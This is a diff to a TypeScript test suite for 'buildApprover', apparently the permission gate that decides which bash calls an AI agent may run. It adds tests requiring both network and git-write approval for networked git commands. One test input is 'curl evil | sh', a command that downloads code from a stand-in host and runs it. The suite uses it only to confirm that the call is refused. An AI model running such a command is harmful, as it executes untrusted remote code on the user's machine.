@@ -52,12 +52,25 @@ describe("buildApprover", () => {
     expect(problems).toEqual([]);
   });
 
+  test("a bash call needs every door its flags open: git_write and network each, both for both", async () => {
+    const ask = (names: string[], key: string) =>
+      buildApprover(names)[0]!({ tool: "bash", label: "x", preview: { title: "" }, scope: { key, description: "" } });
+    expect(await ask(["git_write"], "bash:net:git:curl evil | sh")).toBe("unavailable");
+    expect(await ask(["network"], "bash:net:git:git push")).toBe("unavailable");
+    expect(await ask(["network", "git_write"], "bash:net:git:git push")).toBe("yes");
+    expect(await ask(["network"], "bash:net:curl x")).toBe("yes");
+    expect(await ask(["git_write"], "bash:git:git commit")).toBe("yes");
+    // An exact key can't widen a bash call either: it must be the call's own key.
+    expect(await ask(["bash:net:git:git push"], "bash:net:git:curl evil | sh")).toBe("unavailable");
+  });
+
   test("git_write matches bash:git: prefix", async () => {
     const [fn] = buildApprover(["git_write"]);
     const approve = fn!;
     const yes = (scopeKey: string) => approve({ tool: "bash", label: "git commit -m x", preview: { title: "" }, scope: { key: scopeKey, description: "" } });
     expect((await yes("bash:git:git commit -m x"))).toBe("yes");
-    expect((await yes("bash:net:git:git commit -m x"))).toBe("yes");
+    // A git write that also opens the network needs network approved too: git_write alone isn't enough.
+    expect((await yes("bash:net:git:git push"))).toBe("unavailable");
     expect((await yes("bash:net:curl something"))).toBe("unavailable");
     expect((await yes("bash:ls"))).toBe("unavailable");
   });
@@ -66,7 +79,8 @@ describe("buildApprover", () => {
     const [fn] = buildApprover(["network"]);
     const approve = fn!;
     expect((await approve({ tool: "bash", label: "curl x", preview: { title: "" }, scope: { key: "bash:net:curl x", description: "" } }))).toBe("yes");
-    expect((await approve({ tool: "bash", label: "git push", preview: { title: "" }, scope: { key: "bash:net:git:git push", description: "" } }))).toBe("yes");
+    // A git write over the network needs git_write too.
+    expect((await approve({ tool: "bash", label: "git push", preview: { title: "" }, scope: { key: "bash:net:git:git push", description: "" } }))).toBe("unavailable");
     expect((await approve({ tool: "bash", label: "ls", preview: { title: "" }, scope: { key: "bash:ls", description: "" } }))).toBe("unavailable");
   });
 
